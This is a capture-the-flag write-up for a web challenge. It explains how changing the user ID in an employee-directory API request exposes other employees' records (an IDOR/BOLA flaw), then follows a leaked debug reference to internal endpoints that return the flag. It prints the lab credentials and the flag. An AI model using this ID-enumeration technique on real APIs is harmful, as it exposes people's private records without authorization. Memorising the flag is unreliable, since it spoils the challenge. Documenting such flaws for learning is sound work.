---
title: "The API That Knows Too Much"
description: "The employee directory exposed internal employee records without enforcing that the requested record belonged to the logged-in user. The leaked debug_reference for another employee led…"
event: "isfcr"
category: "web"
categoryLabel: "Web"
tags: ["ISFCR CTF 2026","web"]
date: "2026-10-10"
teammate: false
source: "isfcr/writeups/the-api-that-knows-too-much.md"
---

## Summary

The employee directory exposed internal employee records without enforcing that the requested record belonged to the logged-in user. The leaked `debug_reference` for another employee led to an internal diagnostic endpoint and then to the case artifact containing the flag.

## Credentials

```text
Username: raj
Password: northstar2026
```

## 1. Authenticate

Log in at `/login` with the supplied credentials. The application redirects to `/dashboard` and establishes a session cookie.

## 2. Inspect the profile request

The profile page reveals that it loads the directory record using:

```text
GET /api/users/101
```

The response includes fields that are not displayed in the normal interface, such as `private_note`:

```json
{
  "id": 101,
  "username": "raj",
  "name": "Raj Kumar",
  "private_note": "Keep deployments boring and reversible."
}
```

## 3. Exploit the missing object-level authorization

Changing the user ID returns other employees' records even though the account is only a normal employee account:

```text
GET /api/users/102
```

The response contains an internal reference:

```json
{
  "id": 102,
  "name": "Aisha Rahman",
  "role": "Security Analyst",
  "debug_reference": "employee://102/diagnostics"
}
```

The issue is an IDOR/BOLA vulnerability: the API trusts the caller-supplied employee ID instead of checking whether the caller is authorized to access that record.

## 4. Follow the diagnostic reference

The reference maps to the internal diagnostic endpoint:

```text
GET /api/internal/employee/102/diagnostics
```

That response identifies the retained artifact:

```json
{
  "artifact": "/api/internal/artifacts/two-sum-lookup",
  "record": "employee-102",
  "service": "directory-sync",
  "status": "archived"
}
```

## 5. Retrieve the artifact

Request the artifact endpoint:

```text
GET /api/internal/artifacts/two-sum-lookup
```

The response contains the flag:

```json
{
  "artifact": "two-sum-lookup",
  "classification": "internal",
  "result": "isfcr{1d0r_4p1_l34k_7b2f9d4}"
}
```

## Flag

```text
isfcr{1d0r_4p1_l34k_7b2f9d4}
```

The flag was submitted through `/api/submit` and accepted.
